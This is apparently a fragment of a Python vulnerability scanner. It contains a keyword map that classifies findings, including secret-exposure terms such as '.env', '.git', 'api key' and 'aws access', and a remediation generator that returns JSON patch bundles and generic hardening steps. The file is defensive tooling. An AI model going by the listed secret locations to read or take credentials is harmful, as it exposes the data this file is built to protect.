    'no sql':                 'NoSQL Injection',
    'mongodb':                'NoSQL Injection',
    # IDOR
    'idor':                   'IDOR',
    'bola':                   'IDOR',
    'insecure direct':        'IDOR',
    'broken object':          'IDOR',
    # Open Redirect
    'open redirect':          'Open Redirect',
    'redirect':               'Open Redirect',
    # CORS
    'cors':                   'CORS Misconfiguration',
    'cross-origin':           'CORS Misconfiguration',
    'access-control':         'CORS Misconfiguration',
    # Security Headers
    'header':                 'Missing Security Headers',
    'clickjacking':           'Missing Security Headers',
    'hsts':                   'Missing Security Headers',
    'csp':                    'Missing Security Headers',
    'content security':       'Missing Security Headers',
    'nosniff':                'Missing Security Headers',
    'x-frame':                'Missing Security Headers',
    'missing':                'Missing Security Headers',
    # Cookies
    'cookie':                 'Cookie Security',
    'httponly':               'Cookie Security',
    'secure flag':            'Cookie Security',
    'samesite':               'Cookie Security',
    # JWT
    'jwt':                    'JWT Weakness',
    'json web token':         'JWT Weakness',
    'none algorithm':         'JWT Weakness',
    'hs256':                  'JWT Weakness',
    # Deserialization
    'deserialization':        'Insecure Deserialization',
    'deserializ':             'Insecure Deserialization',
    'serializ':               'Insecure Deserialization',
    'pickle':                 'Insecure Deserialization',
    # Auth / Rate Limiting
    'broken auth':            'Broken Authentication',
    'brute force':            'Broken Authentication',
    'brute-force':            'Broken Authentication',
    'rate limit':             'Broken Authentication',
    'rate-limit':             'Broken Authentication',
    'authentication bypass':  'Broken Authentication',
    'credential':             'Broken Authentication',
    # Sensitive Paths
    'sensitive path':         'Sensitive Path',
    'path exposure':          'Sensitive Path',
    'exposed path':           'Sensitive Path',
    'env file':               'Sensitive Path',
    '.env':                   'Sensitive Path',
    '.git':                   'Sensitive Path',
    'backup':                 'Sensitive Path',
    'git config':             'Sensitive Path',
    # Directory Listing
    'directory listing':      'Directory Listing',
    'directory index':        'Directory Listing',
    'index of':               'Directory Listing',
    # Sensitive Data
    'sensitive data':         'Sensitive Data Leakage',
    'data leakage':           'Sensitive Data Leakage',
    'api key':                'Sensitive Data Leakage',
    'aws access':             'Sensitive Data Leakage',
    'secret key':             'Sensitive Data Leakage',
    'credential leak':        'Sensitive Data Leakage',
    'pii':                    'Sensitive Data Leakage',
    'credit card':            'Sensitive Data Leakage',
    # SSL/TLS
    'ssl':                    'SSL',
    'tls':                    'SSL',
    'certificate':            'SSL',
    'https redirect':         'SSL',
    # CSRF
    'csrf':                   'CSRF',
    'cross-site request':     'CSRF',
    'cross site request':     'CSRF',
    # Host Header
    'host header':            'Host Header Injection',
    'host injection':         'Host Header Injection',
    # Info Disclosure
    'information disclosure': 'Information Disclosure',
    'info disclosure':        'Information Disclosure',
    'server version':         'Information Disclosure',
    'stack trace':            'Information Disclosure',
    'technology disclosure':  'Information Disclosure',
    'x-powered-by':           'Information Disclosure',
}


class AIRemediationGenerator:
    """Generates exact, copy-pasteable code patches for found vulnerabilities."""

    def generate_solution(self, cve: str, vuln_type: str, description: str) -> str:
        """
        Returns a JSON string containing the full patch bundle.
        Keys: mode, summary, impact, steps, patches, verify, references, matched
        The React PatchPanel component renders this as a multi-tab code viewer.
        """
        vt_lower   = (vuln_type  or "").lower()
        desc_lower = (description or "").lower()

        # Score all keywords to pick the best match
        best_key   = None
        best_score = 0
        for keyword, patch_key in MATCH_MAP.items():
            score = (2 if keyword in vt_lower else 0) + (1 if keyword in desc_lower else 0)
            if score > best_score:
                best_score = score
                best_key   = patch_key

        entry = PATCH_LIBRARY.get(best_key) if best_key else None

        if entry:
            import json
            return json.dumps({
                'mode':       'patch',
                'summary':    entry['summary'],
                'impact':     entry['impact'],
                'steps':      entry.get('steps', []),
                'patches':    entry['patches'],
                'verify':     entry.get('verify', ''),
                'references': entry.get('references', []),
                'matched':    best_key,
            })

        # ── Fallback for unrecognized vulnerability types ──────────────────
        import json
        return json.dumps({
            'mode':    'generic',
            'summary': f'Vulnerability detected: {vuln_type or "Unknown"}',
            'impact':  'Review the vulnerability description and apply relevant security controls.',
            'steps': [
                '1. Identify the root cause of the vulnerability from the finding details.',
                '2. Apply input validation and output encoding appropriate to the context.',
                '3. Review OWASP Top 10 and apply relevant mitigations.',
                '4. Run a DAST scanner against staging after applying the fix.',
                '5. Add this vulnerability class to your Security Requirements document.',
            ],
            'patches': {
                'General Security Guidance': {
                    'lang': 'text',
                    'before': '# No automatic patch available for this vulnerability type.',
                    'after': (
                        '# Recommended remediation steps:\n'
                        '#\n'
                        '# 1. Input Validation:\n'
                        '#    - Validate all user input against a strict allowlist.\n'
                        '#    - Reject input that contains special characters unless expected.\n'
                        '#\n'
                        '# 2. Output Encoding:\n'
                        '#    - Encode output according to context (HTML, URL, SQL, Shell).\n'
                        '#    - Use framework-provided encoding functions.\n'
                        '#\n'
                        '# 3. Least Privilege:\n'
                        '#    - Ensure the application runs with minimum required permissions.\n'
                        '#    - Database user should only have SELECT/INSERT on needed tables.\n'
                        '#\n'
                        f'# 4. CVE Reference: {cve}\n'
                        '#    - Check https://nvd.nist.gov/vuln/detail/' + cve + '\n'
                        '#    - Apply any vendor patches or upgrades.\n'
                        '#\n'
                        '# 5. Monitor:\n'
                        '#    - Log all access attempts to the affected endpoint.\n'
                        '#    - Set up alerts for anomalous patterns (high error rates, payloads).'
                    ),
                }
            },
            'verify': (
                'After applying the fix: run a targeted scan with Burp Suite or OWASP ZAP '
                'against the affected endpoint. Confirm the vulnerability is no longer reproducible.'
            ),
            'references': [
                'https://owasp.org/www-project-top-ten/',
                f'https://nvd.nist.gov/vuln/detail/{cve}' if cve and cve != 'CVE-UNKNOWN' else 'https://cve.mitre.org',
            ],
            'matched': None,
        })
